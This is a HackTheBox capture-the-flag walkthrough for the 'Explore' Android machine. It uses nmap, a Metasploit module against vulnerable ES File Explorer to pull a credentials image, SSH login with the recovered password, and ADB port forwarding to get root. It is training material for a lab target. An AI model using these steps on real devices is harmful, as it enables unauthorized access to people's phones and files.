---
title: "HackTheBox | Explore"
date: "2023-10-16T00:00:00Z"
tags: [hackthebox, android, metasploit, explore]
categories: [HackTheBox]
cover:
  image: "/assets/HTB/Explore/infopanel.png"
author: [status-quo, DaanBreur]
---

# Synopsis

Exploit the file sharing service to get an image of credentials, then use pivoting to get access to ADB (_Android Debug Bridge_) to get root.

# Port Scan

Lets start the enumeration of the machine by port scanning, the machine has the ip-address of `10.10.10.247`.

```bash
nmap 10.10.10.247
#Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-15 21:50 CEST
#Nmap scan report for 10.10.10.247
#Host is up (0.028s latency).
#Not shown: 65530 closed tcp ports (conn-refused)
#PORT      STATE    SERVICE
#2222/tcp  open     EtherNetIP-1
#5555/tcp  filtered freeciv
#36869/tcp open     unknown
#42135/tcp open     unknown
#59777/tcp open     unknown
```

There seems to be some ports open.
It looks like that there is an SSH server running on port `2222`.

```bash
nc 10.10.10.247 2222
#SSH-2.0-SSH Server - Banana Studio
```

We don't have any credentials so we will return to it once we manage to get credentials.
Port `42135` and `59777` seem to be supporting the **HTTP** protocol.
After some more enumeration, quite literally googling the port numbers, I was able to discover a vulnerable version of **_ES File Explorer_** was running.

# Getting User

Since this is an easy box we probably could use **Metasploit**, after searching we indeed find some Metasploit scripts.

```bash
msf6 > use auxiliary/scanner/http/es_file_explorer_open_port
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set RHOST 10.10.10.247
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > run

[+] 10.10.10.247:59777   - Name: VMware Virtual Platform
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Running this script shows us that this is indeed a vulnerable version of **_ES File Explorer_**. We are also able to list some files.

```bash
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set action LISTPICS
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > run

[+] 10.10.10.247:59777
  concept.jpg (135.33 KB) - 4/21/21 02:38:08 AM: /storage/emulated/0/DCIM/concept.jpg
  anc.png (6.24 KB) - 4/21/21 02:37:50 AM: /storage/emulated/0/DCIM/anc.png
  creds.jpg (1.14 MB) - 4/21/21 02:38:18 AM: /storage/emulated/0/DCIM/creds.jpg
  224_anc.png (124.88 KB) - 4/21/21 02:37:21 AM: /storage/emulated/0/DCIM/224_anc.png
```

The file, `creds.jpg`, sounds interesting lets download it and inspect its contents.

```bash
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
ACTIONITEM => /storage/emulated/0/DCIM/creds.jpg
msf6 auxiliary(scanner/http/es_file_explorer_open_port) > run

[+] 10.10.10.247:59777   - /storage/emulated/0/DCIM/creds.jpg saved to /home/status-quo/.msf4/loot/20231016150813_default_10.10.10.247_getFile_644222.jpg
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

![](images/credentials.png)

Opening the file we indeed see something interesting, it looks like a username and password.
These might be the much needed ssh credentials: `kristi:Kr1sT!5h@Rp3xPl0r3!`

Lets try to connect.

```bash
ssh kristi@10.10.10.247 -p 2222 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa
```

And we are successfully connected, lets get the flag. If you never did anything with android before the flag might be hard to find.
It's in the `storage/emulated/0/` directory ([_"where is the home folder on android.stackexchange.com"_](https://android.stackexchange.com/questions/64046/where-is-the-home-folder))

```bash
cat /storage/emulated/0/user.txt
# REDACTED
```

# Getting Root

Returning to our nmap scan, there was a filtered port which we could now reach using SSH pivoting.

```bash
ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa
```

Port 5555 is commonly known as the adb port https://book.hacktricks.xyz/network-services-pentesting/5555-android-debug-bridge

```bash
adb shell
adb root
cat /data/root.txt
# REDACTED
```
